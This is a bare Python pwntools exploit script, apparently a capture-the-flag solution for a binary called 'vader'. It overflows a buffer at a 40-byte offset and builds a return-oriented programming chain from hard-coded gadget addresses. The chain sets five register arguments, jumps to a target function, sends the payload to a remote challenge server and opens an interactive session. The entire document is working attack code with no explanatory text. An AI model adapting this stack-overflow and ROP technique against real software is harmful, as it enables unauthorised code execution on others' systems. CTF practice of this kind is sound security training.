from pwn import *
# connect 0.cloud.chals.io:20712
context.log_level = 'debug'
rop = ROP('./vader')
p = remote('0.cloud.chals.io', 20712)
offset = 40


pop_rdi = p64(0x40165b)
pop_rsi_r15 = p64(0x0000000000401659)
pop_rcx_rdx = p64(0x00000000004011cd)
pop_r8 = p64(0x00000000004011d9)
vader_func = p64(0x00000000040146B)
rop.raw([pop_rdi,p64(0x0402ec9),pop_rsi_r15,p64(0x0402ece),b'deadbeef',pop_rcx_rdx,p64(0x0402ed6),p64(0x0402ed3),pop_r8,p64(0x0402eda),vader_func])
rop_chain = rop.chain()
payload = flat({offset:rop_chain})
f = open('payload','wb')
f.write(payload)
p.sendline(payload)
p.interactive()
